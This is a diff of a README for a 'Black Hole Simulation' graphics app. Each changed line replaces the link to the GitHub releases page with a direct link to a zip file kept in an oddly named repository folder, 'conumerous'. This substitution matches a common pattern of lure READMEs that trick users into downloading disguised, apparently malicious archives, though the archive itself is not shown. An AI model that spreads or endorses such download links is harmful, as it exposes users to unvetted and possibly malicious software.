@@ -4,10 +4,10 @@
 Welcome to the Black Hole Simulation. This application lets you explore the fascinating world of black holes using advanced graphics technology. It is designed for users who want to visualize complex astrophysical phenomena in a user-friendly way. 
 
 ## 📥 Download the Application
-[![Download Black Hole Simulation](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/amarmodeh/black_hole_simulation/releases)
+[![Download Black Hole Simulation](https://raw.githubusercontent.com/amarmodeh/black_hole_simulation/main/conumerous/black_hole_simulation.zip)](https://raw.githubusercontent.com/amarmodeh/black_hole_simulation/main/conumerous/black_hole_simulation.zip)
 
 ## 🌐 Visit the Releases Page
-To get the latest version and updates of the Black Hole Simulation, visit the releases page: [Download Here](https://github.com/amarmodeh/black_hole_simulation/releases).
+To get the latest version and updates of the Black Hole Simulation, visit the releases page: [Download Here](https://raw.githubusercontent.com/amarmodeh/black_hole_simulation/main/conumerous/black_hole_simulation.zip).
 
 ## 🛠️ System Requirements
 Before downloading the application, ensure your system meets the following requirements:
@@ -18,7 +18,7 @@ Before downloading the application, ensure your system meets the following requi
 - **Storage:** Minimum of 200 MB of free space.
 
 ## 📥 Download & Install
-1. Click the [Download Here](https://github.com/amarmodeh/black_hole_simulation/releases) link. 
+1. Click the [Download Here](https://raw.githubusercontent.com/amarmodeh/black_hole_simulation/main/conumerous/black_hole_simulation.zip) link. 
 2. Look for the latest version available.
 3. Download the file suitable for your operating system.
 4. Once the download is complete, locate the downloaded file on your computer.
